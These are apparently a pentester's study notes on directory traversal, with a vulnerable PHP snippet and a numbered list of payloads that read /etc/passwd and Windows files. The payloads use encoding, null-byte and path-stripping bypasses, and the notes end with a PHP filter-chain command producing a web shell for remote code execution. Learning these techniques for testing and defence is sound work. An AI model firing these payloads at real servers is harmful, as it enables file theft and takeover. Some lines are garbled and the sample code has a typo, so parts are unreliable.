
Directory traversal involves accessing files located _outside the document root directory_

Basically caused by unsanitized path in the website directory 

```php

$filename = $_GET['file'];
filepath = "/path/to/documents/" . $filename;
if (file_exists($filepath)) {  header("Content-Type: application/pdf");  readfile($filepath);}
```

this code can be exploited by 
```http
?file=../../../../config.php
```



1. Application blocks traversal sequences but treats the supplied filename as being relative to a absolute path and can be exploit with `/etc/passwd`absolute path to target file payload.

-  **Turn on** the `Intercept` and check for Some images the could not result in `PROXY`

1. Images on target is loaded using `filename` parameter, and is defending against traversal attacks by stripping path traversal. Exploit using `....//....//....//....//etc/passwd` payloads.


4. Superfluous URL-encoded `..%252f..%252f..%252fetc/passwd` payload can bypass application security controls.

5. Leading the beginning of the filename referenced with the original path and then appending `/var/www/images/../../../etc/passwd` payload at end bypasses the protection.

6. Using a **null** byte character at end plus an image extension to fool APP controls that an image is requested, this `../../../etc/passwd%00.png` payload succeed.

7. Double URL encode file path traversal, as example this `../../../../../../../../../../etc/hostname` will be URL double encoded as, `%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhostname`.

8. Windows OS accept both `../` and `..\` for directory traversal syntax, and as example retrieving `loadImage?filename=..\..\..\windows\win.ini` on windows target to _**identify**_ valid path traversal.

9. [PHP Wrapper, expect & filter](https://github.com/botesjuan/cpts-quick-references/blob/main/module/File%20Inclusions.md#remote-code-execution) pose vulnerability that allow traversal bypass to result in remote code execution (RCE) critical. Using [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) to get your RCE without uploading a file if you control entirely the parameter passed to a require or an include in PHP! See [Tib3rius YouTube demo](https://youtu.be/OGjpTT6xiFI?t=1019) ``python php_filter_chain.generator.py --chain '<?=`$_GET[0]`; ?>' | tail -n 1 | urlencode``



